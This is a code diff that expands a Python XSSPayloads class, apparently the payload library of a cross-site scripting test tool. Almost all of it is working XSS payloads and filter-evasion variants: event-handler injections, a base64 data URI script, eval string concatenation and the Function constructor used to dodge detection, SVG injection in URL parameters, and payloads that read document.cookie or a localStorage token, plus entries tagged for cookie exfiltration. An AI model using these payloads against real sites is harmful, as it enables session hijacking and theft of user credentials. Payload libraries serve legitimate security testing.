@@ -26,7 +26,7 @@ class XSSPayloads:
                 {
                     "payload": "<script>alert('XSS')</script>",
                     "description": "Basic script tag injection",
-                    "bypass_techniques": ["encoding", "tag_switching"]
+                    "bypass_techniques": ["tag_switching"]
                 },
                 {
                     "payload": "<img src=x onerror=alert('XSS')>",
@@ -47,6 +47,11 @@ class XSSPayloads:
                     "payload": "<iframe src=\"javascript:alert('XSS')\">",
                     "description": "Iframe with javascript URI",
                     "bypass_techniques": ["iframe", "protocol_abuse"]
+                },
+                {
+                    "payload": "<details open ontoggle=alert('XSS')>",
+                    "description": "Details tag with ontoggle event",
+                    "bypass_techniques": ["event_handlers"]
                 }
             ]
         
@@ -72,6 +77,11 @@ class XSSPayloads:
                     "payload": "\" onload=\"alert('XSS')\"",
                     "description": "Onload event in attribute",
                     "bypass_techniques": ["events"]
+                },
+                {
+                    "payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
+                    "description": "Data URI with base64 encoded script",
+                    "bypass_techniques": ["protocol_abuse", "data_uri"]
                 }
             ]
         
@@ -97,6 +107,16 @@ class XSSPayloads:
                     "payload": "alert(document.cookie)",
                     "description": "Direct JavaScript execution",
                     "bypass_techniques": ["function_call"]
+                },
+                {
+                    "payload": "eval('al'+'ert(1)')",
+                    "description": "String concatenation to avoid detection",
+                    "bypass_techniques": ["string_manipulation"]
+                },
+                {
+                    "payload": "Function('alert(1)')()",
+                    "description": "Function constructor bypass",
+                    "bypass_techniques": ["function_abuse"]
                 }
             ]
         
@@ -109,7 +129,7 @@ class XSSPayloads:
         
         # Add storage-specific metadata
         for payload in payloads:
-            payload["storage_medium"] = ["database", "file", "cache", "logs"]
+            payload["storage_medium"] = ["database", "file", "cache", "logs", "cookies"]
             payload["trigger_condition"] = "data_retrieval"
             payload["persistence"] = True
         
@@ -147,6 +167,13 @@ class XSSPayloads:
                     "source": "window.location",
                     "sink": "navigation",
                     "bypass_techniques": ["protocol_abuse"]
+                },
+                {
+                    "payload": "?param=<svg onload=alert('XSS')>",
+                    "description": "SVG in URL parameter",
+                    "source": "location.search",
+                    "sink": "element.innerHTML",
+                    "bypass_techniques": ["svg_injection"]
                 }
             ]
         
@@ -164,7 +191,7 @@ class XSSPayloads:
                     "description": "Cookie stealing via Image object",
                     "source": "document.cookie",
                     "sink": "Image().src",
-                    "bypass_techniques": ["object_abuse"]
+                    "bypass_techniques": ["object_abuse", "exfiltration"]
                 },
                 {
                     "payload": "setTimeout(\"alert('XSS')\", 100)",
@@ -172,6 +199,13 @@ class XSSPayloads:
                     "source": "user_input",
                     "sink": "setTimeout",
                     "bypass_techniques": ["function_abuse"]
+                },
+                {
+                    "payload": "window.location='javascript:alert(document.cookie)'",
+                    "description": "Location-based JavaScript execution",
+                    "source": "window.location",
+                    "sink": "navigation",
+                    "bypass_techniques": ["protocol_abuse"]
                 }
             ]
         
@@ -190,6 +224,13 @@ class XSSPayloads:
                     "source": "document.cookie",
                     "sink": "fetch API",
                     "bypass_techniques": ["exfiltration"]
+                },
+                {
+                    "payload": "\" onerror=\"alert(localStorage.getItem('token'))\"",
+                    "description": "Stealing from localStorage",
+                    "source": "localStorage",
+                    "sink": "event_handler",
+                    "bypass_techniques": ["storage_abuse"]
                 }
             ]
         
